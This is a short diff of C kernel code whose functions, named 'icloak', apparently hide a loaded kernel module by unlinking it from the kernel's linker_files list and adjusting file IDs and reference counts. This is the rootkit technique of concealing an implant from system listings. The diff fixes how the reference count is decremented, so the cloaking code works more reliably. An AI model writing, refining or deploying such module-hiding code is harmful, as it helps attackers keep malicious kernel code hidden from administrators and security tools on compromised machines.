@@ -23,12 +23,11 @@ int native_icloak_ko(const char *name) {
     mtx_lock(&Giant);
     kld_lock
 
-    (&linker_files)->tqh_first->refs--;
-
     if ((kld = find_kld(name)) != NULL) {
         TAILQ_REMOVE(&linker_files, kld, link);
         next_file_id--;
         deleted = 1;
+        linker_files.tqh_first->refs--;
         kld = NULL;
     }
 
@@ -57,8 +56,6 @@ int native_icloak_mk_ko_perm(const char *name, void **exit) {
 
     mtx_lock(&Giant);
     kld_lock
-
-    (&linker_files)->tqh_first->refs--;
 
     if ((kld = find_kld(name)) != NULL) {
         mp = (struct module *)&kld->modules;
@@ -89,8 +86,6 @@ int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
 
     mtx_lock(&Giant);
     kld_lock
-
-    (&linker_files)->tqh_first->refs--;
 
     if ((kld = find_kld(name)) != NULL) {
         mp = (struct module *)&kld->modules;
